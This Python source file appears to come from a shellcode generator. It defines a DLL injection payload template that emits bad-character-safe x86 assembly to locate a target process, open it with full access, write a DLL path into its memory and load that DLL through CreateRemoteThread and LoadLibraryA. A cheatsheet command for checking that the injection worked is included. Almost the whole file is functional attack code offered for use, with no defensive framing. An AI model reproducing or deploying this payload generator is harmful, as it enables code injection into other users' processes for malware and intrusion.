"""Classic DLL injection payload template.

Finds a target process by name (Toolhelp32), opens it, allocates memory
in the remote process, writes the DLL path, resolves LoadLibraryA, and
creates a remote thread to load the DLL.

Template sequence:
  CreateToolhelp32Snapshot -> Process32First/Next loop (find by name) ->
  OpenProcess(PROCESS_ALL_ACCESS) ->
  VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) ->
  WriteProcessMemory(dll_path) ->
  GetModuleHandleA("kernel32.dll") -> GetProcAddress("LoadLibraryA") ->
  CreateRemoteThread(LoadLibraryA, remote_buf) ->
  CloseHandle (thread) -> CloseHandle (process)

Required functions: CreateToolhelp32Snapshot, Process32First, Process32Next,
                    OpenProcess, VirtualAllocEx, WriteProcessMemory,
                    GetModuleHandleA, GetProcAddress, CreateRemoteThread,
                    CloseHandle
Required variables: snapshot_handle, target_pid, proc_handle,
                    remote_buf, thread_handle
Required strings:   process_name, dll_path, kernel32_str, loadlib_str
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import (
    encode_dword,
    safe_push_imm, safe_push_dword,
    safe_lea, safe_mem_load, safe_mem_store,
    safe_push_mem, safe_call_mem,
    safe_dword_store,
)


class DllInjectTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars

        snap_off     = -layout.slot("CreateToolhelp32Snapshot").offset
        p32first_off = -layout.slot("Process32First").offset
        p32next_off  = -layout.slot("Process32Next").offset
        openproc_off = -layout.slot("OpenProcess").offset
        valloc_off   = -layout.slot("VirtualAllocEx").offset
        writemem_off = -layout.slot("WriteProcessMemory").offset
        getmod_off   = -layout.slot("GetModuleHandleA").offset
        getproc_off  = -layout.slot("GetProcAddress").offset
        crt_off      = -layout.slot("CreateRemoteThread").offset
        closehdl_off = -layout.slot("CloseHandle").offset

        snap_h_off   = -layout.slot("snapshot_handle").offset
        pid_off      = -layout.slot("target_pid").offset
        proc_h_off   = -layout.slot("proc_handle").offset
        rbuf_off     = -layout.slot("remote_buf").offset
        thr_h_off    = -layout.slot("thread_handle").offset

        pname_off    = -layout.slot("process_name").offset
        dllpath_off  = -layout.slot("dll_path").offset
        k32str_off   = -layout.slot("kernel32_str").offset
        loadlib_off  = -layout.slot("loadlib_str").offset

        pe32_off     = -layout.slot("PROCESSENTRY32").offset

        # Use MAX_PATH (260) for the remote allocation and write size.
        # The manifest string slot is zero-padded to its declared length,
        # so writing a fixed 260 bytes is safe regardless of the actual
        # path length -- LoadLibraryA reads to the first null terminator.
        alloc_size = 260

        return "\n".join([
            "; -- DLL Injection Payload --",
            f"; Target process: {config.process_name}",
            f"; DLL path: (from manifest dll_path string slot)",
            "",

            # --- Phase 1: Enumerate processes ---
            "    ; Set PROCESSENTRY32.dwSize = 0x128",
            *safe_lea("edi", "ebp", pe32_off, bc),
            *encode_dword(0x128, bc, "eax"),
            *safe_dword_store("edi", 0x00, "eax", bc, tmp="ecx"),
            "",

            "    ; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)",
            "    xor  eax, eax",
            "    push eax                    ; th32ProcessID = 0",
            *safe_push_imm(2, bc),
            "    ; TH32CS_SNAPPROCESS",
            *safe_call_mem("ebp", snap_off, bc),
            *safe_mem_store("ebp", snap_h_off, "eax", bc),
            "",

            "    ; Process32First(hSnapshot, &pe32)",
            *safe_lea("eax", "ebp", pe32_off, bc),
            "    push eax                    ; lppe",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", p32first_off, bc),
            "    test eax, eax",
            "    jz   di_cleanup_snap         ; snapshot empty",
            "",

            "di_enum_loop:",
            "    ; Compare pe32.szExeFile with process_name (case-insensitive)",
            *safe_lea("esi", "ebp", pe32_off, bc),
            "    add  esi, 0x24              ; szExeFile offset within PROCESSENTRY32",
            *safe_lea("edi", "ebp", pname_off, bc),
            "",
            "di_strcmp:",
            "    lodsb                        ; al = *esi++",
            "    mov  cl, byte ptr [edi]",
            "    inc  edi",
            "    test al, al",
            "    jz   di_check_end            ; source hit null",
            "    or   al, 0x20               ; force lowercase (only non-null)",
            "    or   cl, 0x20",
            "    cmp  al, cl",
            "    jne  di_next",
            "    jmp  di_strcmp",
            "",
            "di_check_end:",
            "    test cl, cl                  ; both null = match",
            "    jz   di_found",
            "    ; fall through to di_next (lengths differ)",
            "",
            "di_next:",
            "    ; Process32Next(hSnapshot, &pe32)",
            *safe_lea("eax", "ebp", pe32_off, bc),
            "    push eax                    ; lppe",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", p32next_off, bc),
            "    test eax, eax",
            "    jnz  di_enum_loop",
            "",

            "di_cleanup_snap:",
            "    ; CloseHandle(hSnapshot) -- process not found",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "    jmp  di_done                 ; target not running",
            "",

            "di_found:",
            "    ; Save PID from pe32.th32ProcessID",
            *safe_lea("edi", "ebp", pe32_off, bc),
            "    mov  eax, dword ptr [edi+0x08]",
            *safe_mem_store("ebp", pid_off, "eax", bc),
            "",

            "    ; CloseHandle(hSnapshot)",
            *safe_push_mem("ebp", snap_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",

            # --- Phase 2: Open target process ---
            "    ; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId)",
            *safe_push_mem("ebp", pid_off, bc),
            "    xor  eax, eax",
            "    push eax                    ; bInheritHandle = FALSE",
            *safe_push_dword(0x001F0FFF, bc),
            "    ; PROCESS_ALL_ACCESS = 0x001F0FFF",
            *safe_call_mem("ebp", openproc_off, bc),
            "    test eax, eax",
            "    jz   di_done                 ; could not open process",
            *safe_mem_store("ebp", proc_h_off, "eax", bc),
            "",

            # --- Phase 3: Allocate remote buffer ---
            f"    ; VirtualAllocEx(hProc, NULL, {alloc_size}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
            *safe_push_dword(0x04, bc),
            "    ; PAGE_READWRITE",
            *safe_push_dword(0x3000, bc),
            "    ; MEM_COMMIT|MEM_RESERVE",
            *safe_push_imm(alloc_size, bc),
            f"    ; size = MAX_PATH ({alloc_size})",
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            *safe_push_mem("ebp", proc_h_off, bc),
            *safe_call_mem("ebp", valloc_off, bc),
            "    test eax, eax",
            "    jz   di_close_proc           ; VirtualAllocEx failed",
            *safe_mem_store("ebp", rbuf_off, "eax", bc),
            "",

            # --- Phase 4: Write DLL path to remote buffer ---
            f"    ; WriteProcessMemory(hProc, remoteBuf, &dll_path, {alloc_size}, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpNumberOfBytesWritten = NULL",
            *safe_push_imm(alloc_size, bc),
            f"    ; nSize = MAX_PATH ({alloc_size})",
            *safe_lea("eax", "ebp", dllpath_off, bc),
            "    push eax                    ; lpBuffer = &dll_path",
            *safe_push_mem("ebp", rbuf_off, bc),
            "    ; lpBaseAddress = remote buffer",
            *safe_push_mem("ebp", proc_h_off, bc),
            *safe_call_mem("ebp", writemem_off, bc),
            "    test eax, eax",
            "    jz   di_close_proc           ; WriteProcessMemory failed",
            "",

            # --- Phase 5: Resolve LoadLibraryA address ---
            "    ; GetModuleHandleA(\"kernel32.dll\")",
            *safe_lea("eax", "ebp", k32str_off, bc),
            "    push eax",
            *safe_call_mem("ebp", getmod_off, bc),
            "    test eax, eax",
            "    jz   di_close_proc           ; GetModuleHandleA failed",
            "",

            "    ; GetProcAddress(hKernel32, \"LoadLibraryA\")",
            *safe_lea("ecx", "ebp", loadlib_off, bc),
            "    push ecx                    ; lpProcName",
            "    push eax                    ; hModule = kernel32 base",
            *safe_call_mem("ebp", getproc_off, bc),
            "    test eax, eax",
            "    jz   di_close_proc           ; GetProcAddress failed",
            "    mov  ebx, eax               ; ebx = LoadLibraryA address",
            "",

            # --- Phase 6: CreateRemoteThread ---
            "    ; CreateRemoteThread(hProc, NULL, 0, LoadLibraryA, remoteBuf, 0, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpThreadId = NULL",
            "    push eax                    ; dwCreationFlags = 0",
            *safe_push_mem("ebp", rbuf_off, bc),
            "    ; lpParameter = remote buffer (DLL path)",
            "    push ebx                    ; lpStartAddress = LoadLibraryA",
            "    push eax                    ; dwStackSize = 0",
            "    push eax                    ; lpThreadAttributes = NULL",
            *safe_push_mem("ebp", proc_h_off, bc),
            *safe_call_mem("ebp", crt_off, bc),
            "    test eax, eax",
            "    jz   di_close_proc           ; CreateRemoteThread failed",
            *safe_mem_store("ebp", thr_h_off, "eax", bc),
            "",

            "    ; CloseHandle(hThread)",
            *safe_push_mem("ebp", thr_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",

            "di_close_proc:",
            "    ; CloseHandle(hProcess)",
            *safe_push_mem("ebp", proc_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",

            "di_done:",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        proc = config.process_name or "target.exe"
        dll = config.dst_path or "C:\\inject.dll"
        return [
            ("Target process", proc),
            ("DLL to inject", dll),
            ("Verify injection", f"tasklist /m /fi \"imagename eq {proc}\""),
        ]
